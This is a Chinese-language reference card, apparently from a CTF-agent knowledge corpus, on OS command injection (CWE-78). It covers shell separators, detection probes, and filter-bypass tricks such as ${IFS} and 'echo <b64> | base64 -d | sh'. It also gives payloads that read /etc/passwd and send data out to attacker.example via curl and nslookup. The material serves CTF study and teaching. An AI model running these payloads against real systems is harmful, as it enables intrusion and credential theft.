---
source_url: knowledge/reference/web/command-injection.md
source_title: 命令注入模式（分隔符/过滤绕过）— reviewed solution pattern
source_version: "1.0"
publisher: CTF-Agent reviewed corpus
license: CC-BY-4.0
retrieved_at: 2026-08-31
topic: web
keywords_en: command injection, shell injection, RCE, OS command, 命令注入
cwe_id: CWE-78
---

# 命令注入模式（分隔符 / 过滤绕过）

> 本文为通用技术模式卡片，不含任何具体题目的 flag、附件路径、端点地址或原始 payload。

## 核心概念

用户输入被拼进 shell 命令（如 `ping $ip`、`cat $file`）且未过滤特殊字符时，攻击者可注入新命令。核心要素：**注入分隔符**（让 shell 把输入当作多条命令）、**闭合上下文**（输入位于引号内要先闭合）、**回显/盲注利用**（有输出直接读文件，无输出用时间或外带）。

## 关键细节

**分隔符全集**（按 shell 语义）：
- `;` 顺序执行；`&&` 前命令成功才执行；`||` 前命令失败才执行；`|` 管道（前命令输出作为后命令输入）；`&` 后台执行。
- 命令替换：`` `cmd` `` 与 `$(cmd)`（POSIX，推荐）；换行 `%0a`（URL 编码的 `\n`）也常被当分隔符。
- 参数注入场景：若输入直接作为某程序参数（不经 shell），先确认是否真的经过 shell（如 `subprocess.call` 传 list 时不注入，传 string 时注入）。

**探测三步**：
1. 直接注入：`ip=127.0.0.1;echo MARKER` → 输出含 MARKER 即有回显命令执行。
2. 无回显探测：`ip=127.0.0.1;sleep 5` → 请求耗时明显增加即时间盲注成立。
3. 换行变体：`%0aid`、`%0aecho x`（URL 场景空格常被滤，换行不过滤）。

**回显利用**：
```bash
;cat /etc/passwd
;whoami;uname -a
;id
```

**无回显拿数据（外带）**：
```bash
;curl http://attacker.example/$(whoami)
;nslookup $(whoami).attacker.example
;curl http://attacker.example/$(cat /etc/passwd | base64 -w0)
```
base64 编码防止特殊字符破坏 URL/日志。

**过滤绕过**（按过滤类型）：
- 空格被过滤：`${IFS}`（bash）、`$IFS$9`、`%09`（tab）、`%0a`、`{cat,/etc/passwd}` 花括号无空格写法、重定向 `cat</etc/passwd`。
- 关键字被过滤：引号/反斜杠拆分 `c''at`、`c"a"t`、`c\at`；变量插入 `c$@at`、`c$*at`；正则类 `/[a]?` 化整为零（如 `/bin/ca[t]` 形式对 `cat` 生效）。
- 全命令 base64 化：`echo <b64> | base64 -d | sh`（绕过几乎所有字符级黑名单，前提 `base64` 可用）。
- 命令替换内嵌编码：`$(echo <b64> | base64 -d)` 直接执行解码结果。

## 常见坑

- 输入位于双引号内（如 `ping "$ip"`）：先注入 `"` 闭合，再跟 `;cmd`；单引号同理。
- `&&` 在注入点前命令失败时会短路——不确定前命令成败时优先用 `;` 或 `|`。
- 过滤器可能只滤第一处关键字：`;cat /etc/passwd;cat /etc/passwd` 双写绕过（黑名单替换为空时双写最有效）。
- 命令执行环境的 `PATH` 可能被改：用绝对路径 `/bin/sh`、`/usr/bin/curl` 更稳。
- `sh` 与 `bash` 差异：`${IFS}` 在 `dash` 中写法不同（`${IFS}` 可直接用），先探测是哪种 shell。
- 过滤空格后 `curl` 的 URL 不能带空格，参数用引号或 `%20` 无效——用变量间接拼接。

## 验证方式

1. 先注入 `;echo MARKER` 确认执行与回显；无回显则 `;sleep 3` 确认时间盲注。
2. 每次只加一个注入变量，隔离"分隔符是否生效"与"过滤器挡了什么"。
3. 绕过链条由内向外构建：先过空格、再过关键字、最后过编码层，每步在目标上实测。
4. 盲注场景用时间差或外带，记录基线耗时设定阈值，避免网络抖动误判。
